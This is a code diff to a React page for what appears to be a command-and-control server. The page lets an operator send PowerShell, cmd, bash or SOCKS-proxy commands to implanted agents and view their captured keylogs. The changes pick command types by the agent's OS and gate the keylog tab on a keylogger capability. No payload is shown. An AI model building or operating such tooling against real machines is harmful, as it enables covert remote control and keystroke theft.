@@ -4,6 +4,28 @@ import AuthContext from '../../context/AuthProvider';
 import { useLocation } from 'react-router-dom';
 import './Agent.css';
 
+const getCommandTypeOptions = (agentOSType) => {
+  const osType = agentOSType.toLowerCase();
+  if (osType.includes('windows')) {
+    return [
+      { value: 'powershell', label: 'PowerShell' },
+      { value: 'cmd', label: 'cmd' },
+      { value: 'socks', label: 'Socks' },
+    ];
+  }
+  if (osType.includes('linux')) {
+    return [
+      { value: 'bash', label: 'bash' },
+      { value: 'sh', label: 'sh' },
+      { value: 'socks', label: 'Socks' },
+    ];
+  }
+  return [
+    { value: 'shell', label: 'Shell' },
+    { value: 'socks', label: 'Socks' },
+  ];
+};
+
 const Agent = () => {
   const axios = useAxios();
   const { auth } = useContext(AuthContext);
@@ -54,7 +76,8 @@ const Agent = () => {
   const [fileToUpload, setFileToUpload] = useState(null);
   const [uploadError, setUploadError] = useState(null);
   const fileInputRef = useRef(null);
-  
+  const agentCapabilities = Array.isArray(data?.capabilities) ? data.capabilities : [];
+  const hasKeylogger = agentCapabilities.includes('keylogger');
 
   const getQueryParam = (param) => {
     const searchParams = new URLSearchParams(location.search);
@@ -125,7 +148,7 @@ const Agent = () => {
       } else {
         setFiles([])
       }
-      if (activeTab === 'keys') {
+      if (activeTab === 'keys' && hasKeylogger) {
         fetchKeylogs(queryParam);
       }
       setNotes(notesResponse.data?.data?.note ?? '');
@@ -239,11 +262,17 @@ const Agent = () => {
   }, [location.search]);
 
   useEffect(() => {
-    if (activeTab !== 'keys') return;
+    if (activeTab !== 'keys' || !hasKeylogger) return;
     const queryParam = getQueryParam('agt');
     if (!queryParam) return;
     fetchKeylogs(queryParam);
-  }, [activeTab, keylogRangeDays, location.search]);
+  }, [activeTab, keylogRangeDays, location.search, hasKeylogger]);
+
+  useEffect(() => {
+    if (!loading && data && activeTab === 'keys' && !hasKeylogger) {
+      setActiveTab('commands');
+    }
+  }, [activeTab, data, hasKeylogger, loading]);
 
   useEffect(() => {
     const id = setInterval(() => setNow(Date.now()), 1000);
@@ -288,7 +317,12 @@ const Agent = () => {
         return;
       }
   
-      const commandBody = { commandType: newCommandType, command: newCommand };
+      const osType = data?.ostype?.trim() || tags.find((tag) => tag.key === 'os_type')?.value?.trim() || '';
+      const options = getCommandTypeOptions(osType);
+      const commandType = options.some((option) => option.value === newCommandType)
+        ? newCommandType
+        : options[0]?.value || 'shell';
+      const commandBody = { commandType, command: newCommand };
       await axios.post(`/api/command/${queryParam}`, commandBody);
       setNewCommand('');
       fetchData();
@@ -359,6 +393,10 @@ const Agent = () => {
   const agentArch = data.arch?.trim() || 'unknown';
   const agentCPUs = data.cpus?.trim() || 'unknown';
   const agentMemory = data.memory?.trim() || 'unknown';
+  const commandTypeOptions = getCommandTypeOptions(agentOSType);
+  const effectiveCommandType = commandTypeOptions.some((option) => option.value === newCommandType)
+    ? newCommandType
+    : commandTypeOptions[0]?.value || 'shell';
 
   const handleKeyPress = (e) => {
     if (e.key === 'Enter') {
@@ -366,7 +404,7 @@ const Agent = () => {
       handleSendCommand();
     }
   };
-  
+
   const renderCommandsTab = () => (
     <div className="commands-list" ref={commandListRef}>
       {commands.length === 0 ? (
@@ -388,19 +426,22 @@ const Agent = () => {
       )}
       <div className="command-input-container">
         <select
-          value={newCommandType}
+          value={effectiveCommandType}
           onChange={(e) => setCommandType(e.target.value)}
           className="command-type-dropdown"
         >
-          <option value="shell">Shell</option>
-          <option value="socks">Socks</option>
+          {commandTypeOptions.map((option) => (
+            <option key={option.value} value={option.value}>
+              {option.label}
+            </option>
+          ))}
         </select>
   
         <input
           type="text"
           className="command-input"
           placeholder={
-            newCommandType === 'socks' ? 'Enter port|disable' : 'Enter shell command'
+            effectiveCommandType === 'socks' ? 'Enter port|disable' : `Enter ${effectiveCommandType} command`
           }
           value={newCommand}
           onChange={(e) => setNewCommand(e.target.value)}
@@ -510,7 +551,7 @@ const Agent = () => {
             const next = Number(e.target.value);
             setKeylogRangeDays(next);
             const queryParam = getQueryParam('agt');
-            if (activeTab === 'keys' && queryParam) {
+            if (activeTab === 'keys' && hasKeylogger && queryParam) {
               fetchKeylogs(queryParam);
             }
           }}
@@ -725,12 +766,14 @@ const Agent = () => {
                 >
                     Files
                 </button>
-                <button
-                    className={activeTab === 'keys' ? 'active' : ''}
-                    onClick={() => setActiveTab('keys')}
-                >
-                    Keylogs
-                </button>
+                {hasKeylogger && (
+                    <button
+                        className={activeTab === 'keys' ? 'active' : ''}
+                        onClick={() => setActiveTab('keys')}
+                    >
+                        Keylogs
+                    </button>
+                )}
                 <button
                     className={activeTab === 'configuration' ? 'active' : ''}
                     onClick={() => setActiveTab('configuration')}
@@ -754,7 +797,7 @@ const Agent = () => {
             <div className="tab-content">
                 {activeTab === 'commands' && renderCommandsTab()}
                 {activeTab === 'files' && renderFilesTab()}
-                {activeTab === 'keys' && renderKeylogsTab()}
+                {hasKeylogger && activeTab === 'keys' && renderKeylogsTab()}
                 {activeTab === 'configuration' && renderConfigurationTab()}
                 {activeTab === 'notes' && renderNotesTab()}
                 {activeTab === 'tags' && renderTagsTab()}
